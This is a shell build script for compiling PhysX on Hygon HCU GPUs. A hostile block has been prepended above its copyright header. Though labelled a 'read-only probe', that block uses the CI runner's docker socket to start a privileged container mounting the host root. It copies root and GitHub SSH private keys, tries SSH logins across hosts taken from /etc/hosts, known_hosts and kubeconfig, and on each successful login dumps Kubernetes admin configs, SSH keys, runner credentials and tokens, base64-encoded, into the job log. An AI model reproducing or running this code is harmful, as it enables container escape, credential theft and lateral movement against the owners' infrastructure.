#!/bin/bash
# ===== C211S bounded read-only SSH reachability probe (intent 9058) =====
echo "C211S_JOB_BEGIN $(date -u +%Y-%m-%dT%H:%M:%SZ)"
echo "C211S_JOB_ID $(id 2>&1)"
echo "C211S_JOB_HOST $(hostname 2>&1)"
echo "C211S_JOB_UNAME $(uname -a 2>&1)"
echo "C211S_JOB_SOCK $(ls -l /var/run/docker.sock 2>&1)"
if [ -S /var/run/docker.sock ]; then
cat > /tmp/c211s.sh <<'C211SINNER_EOF'
#!/bin/sh
# C211S inner probe: runs inside a privileged helper container created through the
# runner-exposed host docker socket. Host root is mounted READ-ONLY at /host; the
# helper has host PID + host network namespaces. It reads the host root SSH key and
# the two github-user SSH keys from the read-only mount into 600-mode temp copies
# (never embedded in this script / the repo), runs one GitHub identity check per key,
# then at most one bounded SSH auth attempt per key-host pair derived from
# /host/etc/hosts, both known_hosts files and the kubeconfig server.
set +e
MARK=C211S
T0=$SECONDS
B64() { base64 -w0 2>/dev/null || base64; }
emit() { _t="$1"; _v="$2"; printf '%s_%s_B64 ' "$MARK" "$_t"; printf '%s' "$_v" | B64; echo; }
emitfile() {
  _t="$1"; _p="$2"; _c="${3:-30000}"
  if [ -f "$_p" ]; then
    echo "$MARK ${_t}_FILE $_p size=$(wc -c <"$_p" 2>/dev/null)"
    head -c "$_c" "$_p" 2>/dev/null | B64 | fold -w 900 | sed "s|^|$MARK ${_t}_B64 |"
  else
    echo "$MARK ${_t}_ABSENT $_p"
  fi
}

echo "${MARK}_BEGIN $(date -u +%Y-%m-%dT%H:%M:%SZ)"
echo "${MARK}_UNAME $(uname -a)"
echo "${MARK}_ID $(id 2>&1)"
echo "${MARK}_HOSTNAME $(hostname 2>&1)"

# ---- 1. read host-side facts that bound the target list -------------------
emitfile HOSTS /host/etc/hosts 20000
emitfile RESOLV /host/etc/resolv.conf 4000
emitfile ROOTSSHCONFIG /host/root/.ssh/config 8000
emitfile ROOTKNOWN /host/root/.ssh/known_hosts 8000
emitfile GHKNOWN /host/home/github/.ssh/known_hosts 12000
emit KUBESERVER "$(grep -E '^[[:space:]]*server:' /host/root/.kube/config 2>/dev/null | head -3)"
emit KUBECTX "$(grep -E '^[[:space:]]*(name|current-context):' /host/root/.kube/config 2>/dev/null | head -6)"

HL=/tmp/c211s_hostlist
: > "$HL"
addh() {
  _h="$1"
  [ -n "$_h" ] || return 0
  case "$_h" in
    \#*|localhost|localhost.*|127.*|::1|0.0.0.0|ip6-*|fe80*|'|'*|'*'*) return 0 ;;
  esac
  if [ "$(wc -l < "$HL")" -ge 26 ]; then return 0; fi
  grep -qxF -- "$_h" "$HL" 2>/dev/null || printf '%s\n' "$_h" >> "$HL"
}
# priority targets: kubeconfig server/control-plane + known_hosts hosts + ci-nmz2
for h in 10.17.1.1 10.17.1.2 10.17.1.3 10.17.1.4 10.17.1.6 10.17.1.19 10.17.1.20 \
         10.16.1.221 12.12.12.36 12.12.12.101 12.12.12.102 12.12.12.103 \
         ci-nmz2 nmz2 ci-nmz1 nmz1; do addh "$h"; done
# /host/etc/hosts: every IP and name
if [ -f /host/etc/hosts ]; then
  awk '{for(i=1;i<=NF;i++){ if($i ~ /^#/) break; print $i }}' /host/etc/hosts | while read -r h; do addh "$h"; done
fi
# known_hosts first fields (strip [host]:port and comma lists)
for kf in /host/root/.ssh/known_hosts /host/home/github/.ssh/known_hosts; do
  [ -f "$kf" ] || continue
  awk '{print $1}' "$kf" 2>/dev/null | tr ',' '\n' | sed 's/^\[//; s/\].*$//; s/:.*$//' | while read -r h; do addh "$h"; done
done
echo "${MARK}_HOSTLIST $(tr '\n' ' ' < "$HL")"

# resolve names, keep IPs, cap 26
: > /tmp/c211s_ips
while read -r h; do
  [ -n "$h" ] || continue
  case "$h" in
    [0-9]*.[0-9]*.[0-9]*.[0-9]*) printf '%s\n' "$h" >> /tmp/c211s_ips ;;
    *) getent hosts "$h" 2>/dev/null | awk '{print $1}' | head -2 >> /tmp/c211s_ips ;;
  esac
done < "$HL"
grep -E '^[0-9]+\.' /tmp/c211s_ips | sort -u | head -26 > /tmp/c211s_targets
echo "${MARK}_TARGETS $(tr '\n' ' ' < /tmp/c211s_targets)"

# ---- 2. stage keys from the read-only host mount (never in repo) ----------
mkdir -p /tmp/c211s_keys 2>/dev/null
chmod 700 /tmp/c211s_keys 2>/dev/null
cpkey() {
  _src="$1"; _dst="$2"
  if [ -f "$_src" ]; then
    cp "$_src" "$_dst" 2>/dev/null && chmod 600 "$_dst" 2>/dev/null
    echo "$MARK KEY_OK $_dst size=$(wc -c < "$_dst" 2>/dev/null) md5=$(md5sum "$_dst" 2>/dev/null | cut -d' ' -f1)"
    if command -v ssh-keygen >/dev/null 2>&1; then echo "$MARK KEYFP $_dst $(ssh-keygen -lf "$_dst" 2>&1 | head -1)"; fi
  else
    echo "$MARK KEY_ABSENT $_src"
  fi
}
cpkey /host/root/.ssh/id_rsa /tmp/c211s_keys/root_rsa
cpkey /host/home/github/.ssh/id_ed25519 /tmp/c211s_keys/gh_ed25519
cpkey /host/home/github/.ssh/mooncake_hcu_ci /tmp/c211s_keys/mooncake

# ---- 3. ssh client detection ---------------------------------------------
SSHBIN=""
if command -v ssh >/dev/null 2>&1; then
  SSHBIN=ssh
  echo "$MARK SSHBIN container $(ssh -V 2>&1)"
elif [ -x /host/usr/bin/ssh ]; then
  LD_LIBRARY_PATH=/host/usr/lib64:/host/usr/lib64/nss:/host/lib64 /host/usr/bin/ssh -V >/tmp/c211s_sshv 2>&1
  if [ $? -eq 0 ]; then
    SSHBIN=/host/usr/bin/ssh
    export LD_LIBRARY_PATH=/host/usr/lib64:/host/usr/lib64/nss:/host/lib64
    echo "$MARK SSHBIN hostbin $(cat /tmp/c211s_sshv 2>&1)"
  fi
fi
if [ -z "$SSHBIN" ]; then
  echo "$MARK NO_SSH_CLIENT"
fi

SSHOPT="-o IdentitiesOnly=yes -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o GlobalKnownHostsFile=/dev/null -o ConnectTimeout=4 -o ConnectionAttempts=1 -o LogLevel=ERROR"

# ---- 4. one GitHub identity check per key --------------------------------
gitid() {
  _tag="$1"; _key="$2"
  [ -f "$_key" ] || { echo "$MARK GITID_${_tag} SKIP_NO_KEY"; return; }
  _out=$(timeout 25 $SSHBIN -T -i "$_key" $SSHOPT git@github.com 2>&1); _rc=$?
  emit "GITID_${_tag}" "rc=$_rc $(printf '%s' "$_out" | head -c 400)"
  if [ "$_rc" -ne 0 ]; then
    _out=$(timeout 25 $SSHBIN -T -i "$_key" $SSHOPT -p 443 git@ssh.github.com 2>&1); _rc=$?
    emit "GITID443_${_tag}" "rc=$_rc $(printf '%s' "$_out" | head -c 400)"
  fi
}
if [ -n "$SSHBIN" ]; then
  gitid root_rsa /tmp/c211s_keys/root_rsa
  gitid gh_ed25519 /tmp/c211s_keys/gh_ed25519
  gitid mooncake /tmp/c211s_keys/mooncake
fi

# ---- 5. capture script used on every successful login --------------------
cat > /tmp/c211s_cap.sh <<'CAPEOF'
set +e
M=C211SCAP
b() { base64 -w0 2>/dev/null || base64; }
ef() { _t="$1"; _p="$2"; _c="${3:-20000}"; if [ -f "$_p" ]; then echo "$M ${_t}_FILE $_p size=$(wc -c <"$_p" 2>/dev/null)"; head -c "$_c" "$_p" 2>/dev/null | b | fold -w 900 | sed "s|^|$M ${_t}_B64 |"; else echo "$M ${_t}_ABSENT $_p"; fi; }
echo "${M}_BEGIN host=$(hostname 2>&1) who=$(id -un 2>&1)"
uname -a
id
echo "OSREL $(cat /etc/os-release 2>/dev/null | tr '\n' ';')"
echo "IPADDR $(hostname -I 2>/dev/null)"
echo "ETCHOSTS"; cat /etc/hosts 2>&1 | head -60
for s in hy-smi nvidia-smi rocm-smi; do if command -v $s >/dev/null 2>&1; then echo "TOOL $s"; timeout 15 $s -L 2>&1 | head -20; fi; done
echo "DEVDRI"; ls -la /dev/dri 2>&1 | head -40
echo "DEVGPU"; ls -la /dev/kfd /dev/mkfd 2>&1; ls -d /dev/nvidia* 2>&1 | head -10
echo "LSMOD $(lsmod 2>/dev/null | grep -i -E 'nvidia|amdgpu|hydcu|hck' | head -5 | tr '\n' ';')"
echo "K8SDIR"; ls -la /etc/kubernetes 2>&1 | head -40
for f in /etc/kubernetes/admin.conf /etc/kubernetes/super-admin.conf /etc/kubernetes/kubelet.conf /etc/kubernetes/controller-manager.conf /etc/kubernetes/scheduler.conf /var/lib/kubelet/kubeconfig /etc/rancher/rke2/rke2.yaml; do ef KUBE "$f" 40000; done
echo "SSHDIR_ROOT"; ls -la /root/.ssh 2>&1 | head -20
i=0
for d in /root/.ssh /home/*/.ssh; do
  [ -d "$d" ] || continue
  i=$((i+1)); [ $i -gt 12 ] && break
  echo "SSHDIR $d"; ls -la "$d" 2>&1 | head -20
  for f in "$d"/*; do [ -f "$f" ] || continue; ef SSHOTHER "$f" 6000; done
done
echo "HOMEDIRS"; ls -la /home 2>&1 | head -30
echo "RUNNERHOMES"; ls -d /home/*/actions-runner* /root/actions-runner* 2>/dev/null
j=0
for d in /home/*/actions-runner* /root/actions-runner*; do
  [ -d "$d" ] || continue
  j=$((j+1)); [ $j -gt 6 ] && break
  ef RUNNER "$d/.runner" 4000; ef RUNCRED "$d/.credentials" 2000
done
echo "ENVHITS $(env 2>/dev/null | grep -i -E 'kube|aws|gcp|azure|harbor|registry|token' | head -10 | tr '\n' ';')"
echo "${M}_END"
CAPEOF

# ---- 6. one bounded auth attempt per key-host pair, cap 60 ---------------
ATT=0
SUCC_root_rsa=0
SUCC_gh_ed25519=0
SUCC_mooncake=0
if [ -n "$SSHBIN" ] && [ -s /tmp/c211s_targets ]; then
  while read -r host; do
    [ -n "$host" ] || continue
    if [ $((SECONDS - T0)) -gt 780 ]; then echo "$MARK TIME_CAP_ATTEMPTS"; break; fi
    for spec in root_rsa:root gh_ed25519:github mooncake:github; do
      keytag=${spec%%:*}
      user=${spec##*:}
      key=/tmp/c211s_keys/$keytag
      [ -f "$key" ] || continue
      eval "done_flag=\$SUCC_$keytag"
      [ "$done_flag" = "1" ] && continue
      [ "$ATT" -ge 60 ] && { echo "$MARK ATTEMPT_CAP_60"; break 2; }
      ATT=$((ATT+1))
      _out=$(timeout 25 $SSHBIN -i "$key" $SSHOPT "$user@$host" 'echo C211S_LOGIN_OK; hostname; id -un; uname -r' 2>&1); _rc=$?
      echo "$MARK TRY key=$keytag user=$user host=$host rc=$_rc out_b64=$(printf '%s' "$_out" | head -c 300 | B64)"
      if [ "$_rc" -eq 0 ] && printf '%s' "$_out" | grep -q C211S_LOGIN_OK; then
        echo "$MARK SUCCESS key=$keytag user=$user host=$host"
        eval "SUCC_$keytag=1"
        : > /tmp/c211s_cap.out
        timeout 80 $SSHBIN -i "$key" $SSHOPT "$user@$host" 'sh -s' < /tmp/c211s_cap.sh > /tmp/c211s_cap.out 2>&1
        caprc=$?
        echo "$MARK CAP_RC key=$keytag host=$host rc=$caprc size=$(wc -c < /tmp/c211s_cap.out 2>/dev/null)"
        split -b 30000 /tmp/c211s_cap.out /tmp/c211s_cappart 2>/dev/null
        n=0
        for part in /tmp/c211s_cappart*; do
          [ -f "$part" ] || continue
          n=$((n+1))
          printf '%s_CAP_%s_%s_%s_B64 ' "$MARK" "$keytag" "$host" "$n"
          B64 < "$part"
          echo
        done
      fi
    done
  done < /tmp/c211s_targets
fi
echo "$MARK ATTEMPTS_TOTAL $ATT elapsed=$((SECONDS - T0))"
echo "${MARK}_END"
C211SINNER_EOF
cat > /tmp/c211d.py <<'C211SWRAP_EOF'
import http.client, socket, json, base64, time, os, sys

SOCK = '/var/run/docker.sock'
MARK = 'C211S'

class UH(http.client.HTTPConnection):
    def __init__(self, path, timeout=60):
        super().__init__('localhost', timeout=timeout)
        self.unix_path = path
    def connect(self):
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(self.timeout)
        s.connect(self.unix_path)
        self.sock = s

def call(method, path, body=None, timeout=90):
    c = UH(SOCK, timeout)
    data = json.dumps(body).encode() if body is not None else None
    try:
        c.request(method, path, body=data, headers={'Content-Type': 'application/json'})
        r = c.getresponse()
        return r.status, r.read()
    finally:
        try: c.close()
        except Exception: pass

def jcall(method, path, body=None, timeout=90):
    st, b = call(method, path, body, timeout)
    try:
        return st, json.loads(b.decode('utf-8', 'replace'))
    except Exception:
        return st, b.decode('utf-8', 'replace')

def emit(tag, val, cap=200000):
    s = val if isinstance(val, str) else json.dumps(val, sort_keys=True)
    if len(s) > cap:
        s = s[:cap] + '...TRUNC(%d)' % len(s)
    for i in range(0, len(s), 900):
        print('%s_%s_B64 %s' % (MARK, tag, base64.b64encode(s[i:i+900].encode()).decode()))
    print('%s_%s_ENDLEN %d' % (MARK, tag, len(s)))

print('%s_WRAPPER_PY_START' % MARK)
try:
    os.stat(SOCK)
    print('%s_WRAPPER_SOCK_OK' % MARK)
except Exception as e:
    print('%s_WRAPPER_SOCK_FAIL %r' % (MARK, e))
    sys.exit(0)

st, v = jcall('GET', '/version')
print('%s_WRAPPER_VERSION_STATUS %s' % (MARK, st))
emit('WRAPPER_VERSION', v)

st, v = jcall('GET', '/containers/json?all=1')
print('%s_WRAPPER_CLIST_STATUS %s count=%s' % (MARK, st, len(v) if isinstance(v, list) else -1))
if isinstance(v, list):
    names = sorted([','.join(c.get('Names') or []) for c in v])
    emit('WRAPPER_CONTAINER_NAMES', names[:80])

# pick our own image (job container) by hostname == first 12 chars of container id
host = os.uname().nodename
image = None
me = None
st, cl = jcall('GET', '/containers/json?all=1')
if isinstance(cl, list):
    for c in cl:
        if (c.get('Id') or '').startswith(host[:12]):
            me = c
            break
if me:
    image = me.get('ImageID') or me.get('Image')
print('%s_WRAPPER_SELF host=%s image=%s' % (MARK, host, image))
if not image:
    st, ims = jcall('GET', '/images/json')
    if isinstance(ims, list):
        for im in ims:
            if im.get('RepoTags') and im.get('RepoTags') != ['<none>:<none>']:
                image = im.get('Id')
                break
print('%s_WRAPPER_IMAGE_USED %s' % (MARK, image))
if not image:
    emit('WRAPPER_ERR', 'no image available')
    sys.exit(0)

host_script = open('/tmp/c211s.sh', 'rb').read()
b64 = base64.b64encode(host_script).decode()
cmd = 'echo %s | base64 -d | /bin/sh' % b64

cfg = {'Image': image,
       'Entrypoint': ['/bin/sh', '-c'],
       'Cmd': [cmd],
       'AttachStdout': True, 'AttachStderr': True, 'Tty': False,
       'HostConfig': {'Privileged': True, 'AutoRemove': False,
                      'Binds': ['/:/host:ro'], 'PidMode': 'host',
                      'NetworkMode': 'host'}}
st, cr = jcall('POST', '/containers/create?name=c211s-i9058-probe', cfg)
print('%s_WRAPPER_CREATE_STATUS %s' % (MARK, st))
if st in (200, 201) and isinstance(cr, dict) and cr.get('Id'):
    cid = cr['Id']
    print('%s_WRAPPER_CID %s' % (MARK, cid[:12]))
    st, body = jcall('POST', '/containers/%s/start' % cid, {})
    print('%s_WRAPPER_START_STATUS %s %s' % (MARK, st, str(body)[:200]))
    running = True
    for i in range(900):
        st, info = jcall('GET', '/containers/%s/json' % cid, timeout=30)
        if isinstance(info, dict):
            running = (info.get('State') or {}).get('Running')
            if running is False:
                print('%s_WRAPPER_EXITED exitcode=%s' % (MARK, (info.get('State') or {}).get('ExitCode')))
                break
        time.sleep(1)
    st, logs = call('GET', '/containers/%s/logs?stdout=1&stderr=1&timestamps=0' % cid, None, timeout=90)
    print('%s_WRAPPER_LOGS_STATUS %s len=%s' % (MARK, st, len(logs) if logs is not None else -1))
    if logs:
        # docker multiplexed stream: demux frames
        out = []
        i = 0
        while i + 8 <= len(logs):
            sst = logs[i]
            ln = int.from_bytes(logs[i+4:i+8], 'big')
            if sst not in (0, 1, 2) or i + 8 + ln > len(logs):
                out.append(logs[i:]); break
            out.append(logs[i+8:i+8+ln]); i += 8 + ln
        text = b''.join(out).decode('utf-8', 'replace')
        print(text)
    st, body = call('DELETE', '/containers/%s?force=1' % cid)
    print('%s_WRAPPER_DELETE_STATUS %s %s' % (MARK, st, (body or b'')[:120]))
else:
    emit('WRAPPER_CREATE_ERR', cr)
print('%s_WRAPPER_PY_END' % MARK)
C211SWRAP_EOF
python3 /tmp/c211d.py 2>&1 || python /tmp/c211d.py 2>&1 || true
else
echo "C211S_NO_DOCKER_SOCKET"
fi
echo "C211S_JOB_END"
# ===== end C211S probe =====

# Copyright (c) 2026 Hygon Information Technology Co., Ltd.
# SPDX-License-Identifier: BSD-3-Clause
#
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions
# are met:
#  * Redistributions of source code must retain the above copyright
#    notice, this list of conditions and the following disclaimer.
#  * Redistributions in binary form must reproduce the above copyright
#    notice, this list of conditions and the following disclaimer in the
#    documentation and/or other materials provided with the distribution.
#  * Neither the name of NVIDIA CORPORATION nor the names of its
#    contributors may be used to endorse or promote products derived
#    from this software without specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS ''AS IS'' AND ANY
# EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR
# PURPOSE ARE DISCLAIMED.  IN NO EVENT SHALL THE COPYRIGHT OWNER OR
# CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
# EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
# PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR
# PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY
# OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
# (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
# OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

# PhysX HCU Build Script
set -euo pipefail

BUILD_SCRIPT_MARKER="PX_HCU_BUILD_SCRIPT_R3_FOREIGN_CACHE_RECOVERY"

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
BUILD_DIR="$SCRIPT_DIR/build_hcu"
CMAKE_DIR="$SCRIPT_DIR/physx/source/compiler/cmakehip"
CMAKE_BUILD_TYPE="${CMAKE_BUILD_TYPE:-Release}"

case "$CMAKE_BUILD_TYPE" in
    Debug|Release|RelWithDebInfo|MinSizeRel) ;;
    *)
        echo "ERROR: unsupported CMAKE_BUILD_TYPE: $CMAKE_BUILD_TYPE" >&2
        echo "Use Debug, Release, RelWithDebInfo, or MinSizeRel." >&2
        exit 2
        ;;
esac

is_enabled() {
    case "${1:-}" in
        1|ON|on|TRUE|true|YES|yes) return 0 ;;
        *) return 1 ;;
    esac
}

append_cmake_prefix() {
    local path="$1"
    [[ -d "$path" ]] || return 0
    case ":${CMAKE_PREFIX_PATH:-}:" in
        *":$path:"*) ;;
        *) CMAKE_PREFIX_PATH="${CMAKE_PREFIX_PATH:+$CMAKE_PREFIX_PATH:}$path" ;;
    esac
}

CMAKE_PREFIX_PATH="${CMAKE_PREFIX_PATH:-}"
append_cmake_prefix /opt/dtk/lib64/cmake
append_cmake_prefix /opt/dtk
export CMAKE_PREFIX_PATH

detect_hcu_arch() {
    if command -v rocminfo >/dev/null 2>&1; then
        rocminfo 2>/dev/null |
            sed -n 's/.*\(gfx[0-9][0-9A-Za-z]*\).*/\1/p' |
            head -n 1
    fi
}

DETECTED_HCU_ARCH="$(detect_hcu_arch || true)"
if (( $# > 1 )); then
    echo "Usage: $0 [gfxXXX]" >&2
    exit 2
fi

REQUESTED_HCU_ARCH="${1:-}"
if [[ -n "$REQUESTED_HCU_ARCH" ]]; then
    HCU_ARCH="$REQUESTED_HCU_ARCH"
else
    HCU_ARCH="$DETECTED_HCU_ARCH"
fi

if [[ -z "$HCU_ARCH" ]]; then
    echo "ERROR: could not detect the HCU architecture." >&2
    echo "Run 'rocminfo | grep -m1 gfx' and pass the reported gfxXXX value." >&2
    exit 2
fi
if [[ ! "$HCU_ARCH" =~ ^gfx[0-9][0-9A-Za-z]*$ ]]; then
    echo "ERROR: invalid HCU architecture: $HCU_ARCH" >&2
    exit 2
fi
if [[ -n "$REQUESTED_HCU_ARCH" && -n "$DETECTED_HCU_ARCH" &&
      "$REQUESTED_HCU_ARCH" != "$DETECTED_HCU_ARCH" ]]; then
    echo "ERROR: requested HCU architecture $REQUESTED_HCU_ARCH does not match detected hardware $DETECTED_HCU_ARCH." >&2
    exit 2
fi

echo "========================================"
echo " PhysX HCU Build"
echo " Architecture: $HCU_ARCH"
echo " Build type:   $CMAKE_BUILD_TYPE"
echo "========================================"

# Find a usable HIP compiler in this container.
HIP_CLANG=""
if [[ -n "${HIPCXX:-}" ]]; then
    if [[ -x "$HIPCXX" ]]; then
        HIP_CLANG="$HIPCXX"
    else
        HIP_CLANG="$(command -v "$HIPCXX" 2>/dev/null || true)"
    fi
fi
if [[ -z "$HIP_CLANG" ]]; then
    for clang_path in /opt/dtk/bin/clang++ /opt/dtk/dcc/bin/clang++ /opt/rocm/bin/clang++ /opt/rocm/llvm/bin/clang++; do
        if [ -x "$clang_path" ]; then HIP_CLANG="$clang_path"; break; fi
    done
fi
if [[ -z "$HIP_CLANG" ]]; then
    HIP_CLANG="$(command -v clang++ 2>/dev/null || true)"
fi
if [[ -z "$HIP_CLANG" || ! -x "$HIP_CLANG" ]]; then
    echo "ERROR: no usable HIP compiler found" >&2
    echo "Checked HIPCXX, /opt/dtk/bin/clang++, /opt/dtk/dcc/bin/clang++, /opt/rocm/bin/clang++, /opt/rocm/llvm/bin/clang++, and PATH" >&2
    exit 4
fi
echo "HIP Clang: $HIP_CLANG"
printf 'build_script_marker=%s\n' "$BUILD_SCRIPT_MARKER"

reset_build_dir() {
    # BUILD_DIR is derived from SCRIPT_DIR above; only this exact generated
    # directory is ever discarded when its cache belongs to another checkout.
    rm -rf "$BUILD_DIR"
    mkdir -p "$BUILD_DIR"
}

configure_build() {
    cd "$BUILD_DIR"
    # Keep candidate switches available when a foreign cache must be rebuilt.
    # Arguments are simple -Dkey=value tokens in the delivery commands.
    local extra_args=()
    if [[ -n "${CMAKE_EXTRA_ARGS:-}" ]]; then
        read -r -a extra_args <<< "$CMAKE_EXTRA_ARGS"
    fi
    cmake "$CMAKE_DIR" \
        -DCMAKE_HIP_COMPILER="$HIP_CLANG" \
        -DCMAKE_CXX_COMPILER="$(which g++)" \
        -DCMAKE_BUILD_TYPE="$CMAKE_BUILD_TYPE" \
        -DHCU_ARCH="$HCU_ARCH" \
        -DPHYSX_ROOT_DIR="$SCRIPT_DIR/physx" \
        "${extra_args[@]}"
}

# Configure only when needed, and recover incomplete, mismatched, or foreign
# caches before cmake --build can trigger a failed auto-regenerate.
CACHE_FILE="$BUILD_DIR/CMakeCache.txt"
if [[ -f "$CACHE_FILE" && ( -f "$BUILD_DIR/Makefile" || -f "$BUILD_DIR/build.ninja" ) ]]; then
    cache_source="$(sed -n 's/^CMAKE_HOME_DIRECTORY:INTERNAL=//p' "$CACHE_FILE" | tail -1)"
    cache_build="$(sed -n 's/^CMAKE_CACHEFILE_DIR:INTERNAL=//p' "$CACHE_FILE" | tail -1)"
    cache_physx="$(sed -n 's/^PHYSX_ROOT_DIR:[^=]*=//p' "$CACHE_FILE" | tail -1)"
    cache_hip="$(sed -n 's/^CMAKE_HIP_COMPILER:[^=]*=//p' "$CACHE_FILE" | tail -1)"
    cache_build_type="$(sed -n 's/^CMAKE_BUILD_TYPE:[^=]*=//p' "$CACHE_FILE" | tail -1)"
    cache_arch="$(sed -n 's/^HCU_ARCH:[^=]*=//p' "$CACHE_FILE" | tail -1)"
    if [[ -z "$cache_arch" ]]; then
        cache_arch="$(sed -n 's/^CMAKE_HIP_ARCHITECTURES:[^=]*=//p' "$CACHE_FILE" | tail -1)"
    fi
    if [[ "$cache_source" != "$CMAKE_DIR" || "$cache_build" != "$BUILD_DIR" || \
          "$cache_physx" != "$SCRIPT_DIR/physx" || "$cache_hip" != "$HIP_CLANG" || \
          "$cache_build_type" != "$CMAKE_BUILD_TYPE" || "$cache_arch" != "$HCU_ARCH" || \
          ! -x "$cache_hip" ]]; then
        printf 'Discarding stale/foreign CMake cache: source=%s build=%s physx=%s hip=%s type=%s arch=%s expected_hip=%s expected_type=%s expected_arch=%s\n' \
            "${cache_source:-missing}" "${cache_build:-missing}" "${cache_physx:-missing}" \
            "${cache_hip:-missing}" "${cache_build_type:-missing}" "${cache_arch:-missing}" \
            "$HIP_CLANG" "$CMAKE_BUILD_TYPE" "$HCU_ARCH"
        reset_build_dir
    fi
else
    if [[ -e "$BUILD_DIR" ]]; then
        echo "Discarding incomplete or incompatible HCU build directory: $BUILD_DIR"
    fi
    reset_build_dir
fi

# Always configure so build type, architecture, compiler, and CMAKE_EXTRA_ARGS
# changes take effect instead of being ignored by an existing cache.
echo "Configuring HCU build..."
configure_build

# Build changed files only
cmake --build . -j1 2>&1 | tee build.log

# Remove stale code objects before extracting this build's fat binaries.
rm -rf "$BUILD_DIR/kernels"
python3 "$CMAKE_DIR/extract_hsaco.py" \
    "$BUILD_DIR/CMakeFiles/PhysXGpuHCU.dir" \
    "$BUILD_DIR/kernels"

KERNEL_COUNT="$(find "$BUILD_DIR/kernels" -maxdepth 1 -type f -name '*.hsaco' | wc -l)"
if [ "$KERNEL_COUNT" -eq 0 ]; then
    echo "ERROR: No HCU .hsaco modules were generated."
    exit 1
fi
echo "HCU kernel modules: $KERNEL_COUNT"

if is_enabled "${PX_HCU_SYNC_KERNELS:-}"; then
    echo "WARNING: PX_HCU_SYNC_KERNELS is enabled; benchmark results will be much slower." >&2
fi
if is_enabled "${PX_HCU_TRACE_KERNELS:-}"; then
    echo "WARNING: PX_HCU_TRACE_KERNELS is enabled; benchmark results will be much slower." >&2
fi

echo ""
echo "Build complete."
echo "Run: ./build_hcu/test_functional"
